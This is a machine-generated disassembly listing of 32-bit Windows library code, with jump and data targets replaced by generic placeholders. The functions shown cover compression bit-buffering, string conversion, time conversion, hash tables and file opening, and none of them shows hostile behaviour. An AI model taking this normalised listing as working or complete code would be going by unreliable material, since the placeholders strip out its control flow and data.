mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff2
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xe
jle r-xdata
dec edx
mov [ esp + 0x20 ] edx
cmp ebp ebx
jne r-xdata
mov ecx 0x8a
mov esi 0x3
jmp r-xdata
mov [ eax + 0x16b4 ] ecx
mov ecx 0x7
mov esi 0x4
mov ecx 0x6
mov esi 0x3
jmp r-xdata
sub_100134a0
mov eax [ esp + 0x4 ]
sub esp 0x8
xor ecx ecx
mov edx [ eax + 0x1698 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
test edx edx
je r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ ebp + 0x402 ]
mov edx 0x10
sub edx esi
cmp ecx edx
jle r-xdata
mov edx [ eax + 0x169c ]
xor edi edi
xor ebx ebx
mov di [ edx + ecx * 2 ]
mov edx [ eax + 0x1690 ]
mov bl [ ecx + edx ]
inc ecx
test edi edi
mov edx ebx
mov [ esp + 0x14 ] ecx
jne r-xdata
mov dx [ ebp + 0x400 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ ebp + 0x400 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ebx ebx
mov ecx [ eax + 0x16b4 ]
mov bl [ edx + r--data ]
xor esi esi
mov [ esp + 0x1c ] ebx
mov si [ ebp + ebx * 4 + 0x406 ]
mov ebp 0x10
sub ebp esi
mov [ esp + 0x10 ] esi
cmp ecx ebp
jle r-xdata
mov di [ ebp + edx * 4 + 0x2 ]
mov ecx [ eax + 0x16b4 ]
mov esi 0x10
sub esi edi
cmp ecx esi
jle r-xdata
xor ecx ecx
pop edi
mov cx [ ebp + 0x402 ]
pop esi
pop ebp
mov [ eax + 0x16ac ] ecx
pop ebx
add esp 0x8
retn
mov ebp [ esp + 0x20 ]
mov bp [ ebp + ebx * 4 + 0x404 ]
shl bp cl
mov ecx [ eax + 0x16b4 ]
or [ eax + 0x16b0 ] bp
add ecx esi
mov [ eax + 0x16b4 ] ecx
mov ebp [ esp + 0x20 ]
xor esi esi
mov si [ ebp + ebx * 4 + 0x404 ]
mov ebp [ eax + 0x8 ]
mov ebx esi
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr si cl
mov ecx [ esp + 0x10 ]
lea ecx [ ebx + ecx - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b0 ] si
mov [ eax + 0x16b4 ] ecx
jmp r-xdata
mov dx [ ebp + edx * 4 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx edi
jmp r-xdata
xor esi esi
mov si [ ebp + edx * 4 ]
mov edx esi
shl edx cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] dx
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ ecx + ebx ] dl
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr si cl
lea ecx [ edx + edi - 0x10 ]
mov [ eax + 0x16b0 ] si
jmp r-xdata
dec edi
cmp edi 0x100
jae r-xdata
mov ecx [ ebx * 4 + r--data ]
mov ebx 0x10
sub edx ecx
mov ecx [ eax + 0x16b4 ]
sub ebx esi
cmp ecx ebx
jle r-xdata
mov esi [ ebx * 4 + r--data ]
test esi esi
je r-xdata
mov [ eax + 0x16b4 ] ecx
mov ecx edi
shr ecx 0x7
xor ebx ebx
mov bl [ ecx + r--data ]
xor ebx ebx
mov bl [ edi + r--data ]
jmp r-xdata
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
mov ebx edx
mov ebp [ eax + 0x8 ]
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ ebx + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov dx [ ebp + ebx * 4 ]
mov ebp [ esp + 0x20 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ ebp + ebx * 4 ]
mov ebp [ eax + 0x8 ]
mov ebx edx
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
mov ebp [ esp + 0x20 ]
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ ebx + esi - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ebp [ esp + 0x24 ]
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov edx 0x10
mov si [ ebp + ebx * 4 + 0x2 ]
mov [ esp + 0x1c ] ebx
sub edx esi
cmp ecx edx
jle r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ eax + 0x1698 ]
cmp ecx edx
jb r-xdata
mov ecx [ ebx * 4 + r--data ]
mov esi 0x10
sub edi ecx
mov ecx [ eax + 0x16b4 ]
sub esi edx
cmp ecx esi
jle r-xdata
mov edx [ ebx * 4 + r--data ]
test edx edx
je r-xdata
shl edi cl
or [ eax + 0x16b0 ] di
add ecx edx
mov esi edi
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
lea edx [ esi + edx - 0x10 ]
shr di cl
mov [ eax + 0x16b4 ] edx
mov [ eax + 0x16b0 ] di
jmp r-xdata
sub_100138e0
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
xor edx edx
lea eax [ ebx + 0x8c ]
mov ecx 0x7
xor esi esi
mov si [ eax ]
add eax 0x4
add edx esi
dec ecx
jne r-xdata
push ebp
lea eax [ ebx + 0xa8 ]
mov ecx 0x79
mov esi 0x80
xor ebp ebp
mov bp [ eax ]
add eax 0x4
add edi ebp
dec ecx
jne r-xdata
cmp esi 0x100
pop ebp
jge r-xdata
shr edi 0x2
cmp edx edi
pop edi
setbe al
mov [ ebx + 0x1c ] al
pop esi
pop ebx
retn
mov eax 0x100
lea ecx [ ebx + esi * 4 + 0x8c ]
sub eax esi
xor esi esi
mov si [ ecx ]
add ecx 0x4
add edx esi
dec eax
jne r-xdata
sub_10013960
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
xor eax eax
mov esi ecx
and esi 0x1
or eax esi
shr ecx 0x1
shl eax 0x1
dec edx
test edx edx
jg r-xdata
shr eax 0x1
pop esi
retn
sub_10013980
mov eax [ esp + 0x4 ]
push ebx
mov ecx [ eax + 0x16b4 ]
cmp ecx 0x10
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
push esi
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
pop ebx
retn
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
xor ecx ecx
inc edx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x16b0 ] cx
mov ecx [ eax + 0x16b4 ]
add ecx 0xfffffff8
mov [ eax + 0x16b4 ] ecx
sub_10013a10
mov eax [ esp + 0x4 ]
push ebx
push esi
mov edx [ eax + 0x16b4 ]
cmp edx 0x8
jle r-xdata
xor ecx ecx
cmp edx ecx
jle r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
pop esi
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
mov edx [ eax + 0x8 ]
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ edx + esi ] bl
mov edx [ eax + 0x14 ]
inc edx
mov [ eax + 0x14 ] edx
sub_10013a90
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_10013a10
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x16ac ] 0x8
je r-xdata
mov edx eax
dec eax
test edx edx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov [ ecx + edx ] al
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl ah
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov dl al
inc ecx
not dl
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edi [ esi + 0x14 ]
mov ecx eax
not ecx
xor edx edx
inc edi
mov dl ch
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
mov [ edi + ecx ] dl
mov ecx [ esi + 0x14 ]
inc ecx
mov [ esi + 0x14 ] ecx
pop edi
pop esi
retn
lea ecx [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
push ebx
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov bl [ eax ]
mov [ edx + edi ] bl
mov ebx [ esi + 0x14 ]
inc ebx
inc eax
dec ecx
mov [ esi + 0x14 ] ebx
jne r-xdata
pop ebx
sub_10013b7c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_10007d40
mov edi esp
push esi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
and [ edi ] 0x0
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call [ SysAllocString@IAT ]
mov esi [ GetLastError@IAT ]
call esi
test eax eax
je r-xdata
lea esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebp
retn 0x4
xor eax eax
call esi
and eax 0xffff
or eax 0x80070000
jmp r-xdata
push eax
call sub_10013b30
sub_10013bf1
push esi
push edi
mov di [ esp + 0x10 ]
mov esi ecx
cmp di 0x3
je r-xdata
cmp di 0xa
jne r-xdata
cmp di 0xa
je r-xdata
cmp di 0xb
jne r-xdata
mov [ esi ] 0xa
jmp r-xdata
cmp di 0xb
je r-xdata
mov [ esi ] 0x3
mov eax [ esp + 0xc ]
mov [ esi ] di
neg eax
sbb eax eax
mov [ esi + 0x8 ] ax
jmp r-xdata
mov eax [ esp + 0xc ]
mov [ esi + 0x8 ] eax
push 0x80070057
call sub_10013b30
mov eax esi
pop edi
pop esi
retn 0x8
sub_10013c4d
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea ecx [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10013c71
lea eax [ ebp - 0x10 ]
push r--data
push eax
call sub_1000870c
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ esp + 0xc ]
mov [ esi ] r--data
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
pop esi
retn 0xc
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_10013c71
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ esp + 0xc ]
mov [ esi ] r--data
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
pop esi
retn 0xc
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_10013cbf
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov eax [ eax + 0x8 ]
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
test eax eax
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_10013cec
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_10013d4c
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
push [ edi ]
call sub_1000e840
inc eax
push eax
call sub_10014308
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov [ esi + 0x8 ] 0x1
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi ]
push eax
call sub_1000b3d0
pop ecx
pop ecx
sub_10013d89
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
mov eax [ edi + 0x8 ]
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
call sub_1000e840
inc eax
push eax
call sub_10014308
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi + 0x4 ]
push eax
call sub_1000b3d0
pop ecx
pop ecx
jmp r-xdata
sub_10013df6
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x1c ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov esi ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_10009088
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
leave
retn 0x1c
sub_10013e42
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
cmp cx 0x76c
jae r-xdata
movzx edx [ eax + 0xc ]
push [ ebp + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013df6
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10013e8e
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call sub_10013e42
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
sub_10013eda
push ebp
mov ebp esp
sub esp 0x84
and [ ebp - 0x4 ] 0x0
push ecx
call sub_10009384
test eax eax
pop ecx
je r-xdata
and [ ebp - 0x84 ] 0x0
push eax
lea eax [ ebp - 0x84 ]
push [ ebp + 0xc ]
push 0x80
push eax
call sub_100098d8
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x84 ]
push eax
call sub_10014c1b
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_10013f2b
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_100155d2
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_10013f54
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_10013f2b
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_10013fe6
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_10013fd0
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_1001401f
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10014006
mov eax esi
pop esi
retn
sub_10014086
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_10014331
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_10014308
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_10009030
add esp 0x10
pop edi
sub_100140cb
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_10013fd0
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_10014331
and [ esi + 0x4 ] 0x0
pop ecx
sub_1001411f
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_10013fb0
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_10014185
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_100141b7
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_100141ea
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_10014185
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_1001411f
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_10014086
sub_1001423a
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_1001416c
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_1001427c
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_10014308
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_10008cba
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_10014391
mov eax sub_1001a417
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x8 ] 0x0
je r-xdata
call sub_10014669
sub_100143d9
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx ecx
push 0x10
call sub_10014308
test eax eax
pop ecx
je r-xdata
xor edi edi
push 0xffffffff
mov ecx eax
call sub_10014372
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop ebx
leave
retn
test edi edi
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
push eax
call esi
push eax
push [ ebx + 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
pop esi
jne r-xdata
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100151a4
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_1001444e
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
and [ esi + 0x8 ] 0x0
or [ esi + 0x4 ] 0xffffffff
lea ebx [ esi + 0xc ]
and edi 0xffff7fff
mov ecx ebx
call sub_10014b7c
push [ ebp + 0x8 ]
lea eax [ ebp - 0x110 ]
push eax
call sub_1001477a
lea eax [ ebp - 0x110 ]
mov ecx ebx
push eax
call sub_10014c9a
mov eax edi
xor ecx ecx
and eax 0x3
sub eax ecx
je r-xdata
mov ecx 0x80000000
dec eax
je r-xdata
xor eax eax
cmp eax 0x10
je r-xdata
mov ecx 0x40000000
jmp r-xdata
dec eax
jne r-xdata
push 0x3
pop edi
and edi 0x2000
neg edi
sbb edi edi
and edi 0x2
inc edi
inc edi
jmp r-xdata
cmp eax 0x20
je r-xdata
mov eax edi
push 0x1
and eax 0x70
pop ebx
je r-xdata
mov ecx 0xc0000000
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov eax ebx
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
push 0x0
push 0x80
lea edx [ ebp - 0xc ]
push edi
push edx
push eax
push ecx
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x30
je r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esi + 0xc ] eax
call sub_100152d0
push [ ebp + 0x8 ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
call sub_10014c9a
and [ ebp - 0x8 ] 0x0
mov edx edi
not edx
shr edx 0x7
and edx ebx
mov [ ebp - 0xc ] 0xc
test edi 0x1000
mov [ ebp - 0x4 ] edx
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
pop eax
jmp r-xdata
push 0x3
sub_1001456b
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push 0x0
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
